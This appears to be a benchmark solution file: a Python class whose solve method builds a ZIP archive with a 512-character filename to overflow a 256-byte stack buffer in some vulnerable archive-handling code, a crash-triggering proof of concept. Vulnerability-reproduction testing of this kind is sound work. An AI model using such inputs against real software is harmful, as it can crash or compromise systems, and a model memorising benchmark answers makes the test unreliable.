import zipfile
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Create an in-memory byte buffer to construct the ZIP file
        buffer = io.BytesIO()
        
        # Create a ZipFile object. We use ZIP_STORED to keep the structure simple and minimal.
        with zipfile.ZipFile(buffer, 'w', zipfile.ZIP_STORED) as zf:
            # The vulnerability description specifies a stack buffer overflow in a 256-byte
            # filename buffer. To trigger this, we need a filename significantly longer than
            # 256 bytes. 512 bytes is sufficient to overflow the buffer and corrupt the
            # return address or trigger AddressSanitizer.
            bad_filename = "A" * 512
            
            # Add a file entry to the ZIP archive with the long filename.
            # The content of the file entry is irrelevant for triggering the filename overflow.
            zf.writestr(bad_filename, b"poc")
            
        # Return the raw bytes of the constructed ZIP file
        return buffer.getvalue()